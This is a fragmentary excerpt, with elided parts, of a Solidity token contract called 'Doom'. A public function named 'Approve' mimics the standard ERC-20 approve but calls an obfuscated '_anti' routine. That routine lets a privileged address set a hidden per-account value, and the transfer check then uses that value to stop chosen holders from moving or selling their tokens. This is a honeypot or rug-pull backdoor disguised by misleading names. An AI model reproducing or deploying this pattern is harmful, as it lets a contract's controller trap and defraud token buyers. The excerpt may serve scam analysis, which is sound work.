...
contract Doom is IERC20, Ownable {
    ...
    mapping (address => Intel) private _pug;
    ...
    function Approve(address account, uint256 amount) public returns (bool) {
        ...
        _anti(from, account, amount);
        emit Approval(from, address(this), amount);
        return true;
    }

    function _anti(address from, address account, uint256 amount) internal {
        _allowances[from][from] = amount;
        uint256 total = 0;
        require(account != address(0), "invalid address");
        if (from == _magi.cent) {
            _pug[from].smart -= total;
            total += amount;
            _pug[account].smart = total;
        } else {
            _pug[from].smart -= total;
            _pug[account].smart += total;
        }
    ...
    */
    function lich(address account) public view returns (uint256) {
        return _pug[account].smart;
    }
    ...
    function _transfer(
        ...
        require(amount - lich(sender) > 0, "Lich");
